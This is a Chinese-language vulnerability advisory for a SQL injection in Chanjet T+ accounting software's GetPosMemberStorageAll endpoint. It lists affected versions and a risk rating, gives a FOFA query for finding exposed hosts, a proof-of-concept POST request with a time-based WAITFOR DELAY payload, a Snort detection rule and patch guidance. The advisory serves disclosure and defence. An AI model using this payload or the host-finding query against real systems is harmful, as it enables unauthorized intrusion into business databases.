# 畅捷通T+ GetPosMemberStorageAll存在SQL注入漏洞

畅捷通T+ GetPosMemberStorageAll存在SQL注入漏洞

# 影响版本

**畅捷通T+ 13.0** 和 **16.0**

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**  **app=&quot;畅捷通-TPlus&quot;** ​

**POC/EXP：**

**step1 延时注入**

```
POST /tplus/POSSyncService.asmx/GetPosMemberStorageAll HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded

accNum=1&poscode=1&shiftCode=1&dailyCode=1';WAITFOR DELAY '0:0:5'--
```

​![image](assets/image-20260910003216-5zpjsf8.png)​

**sonrt规则：**

```
alert tcp any any -> $HOME_NET any (
    msg:"畅捷通T+ - /tplus/POSSyncService.asmx/GetPosMemberStorageAll SQL注入漏洞 (Time-based Blind)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri; content:"/tplus/POSSyncService.asmx/GetPosMemberStorageAll"; fast_pattern;
    http.content_type; content:"application/x-www-form-urlencoded";
    http.request_body; content:"dailyCode="; nocase;
    http.request_body; pcre:"/WAITFOR\s+DELAY/i";
    metadata:
        service http,
        affected_product "畅捷通T+",
        vulnerability_type "SQL Injection (Time-based)",
        severity "critical";
    classtype:web-application-attack;
    sid:1000739;
    rev:1;
    priority:1;
)
```

# 漏洞修复

* **立即升级**：官方强烈建议所有用户**立即安装官方安全补丁**。

  * **T+ 13.0补丁包**
  * **T+Cloud专属云2026补丁包**
* **临时缓解**：若无法立即升级，可通过防护设备添加规则，**拦截包含SQL注入特征的**  **​`/tplus/POSSyncService.asmx/*`​** ​ **路径请求**。

‍
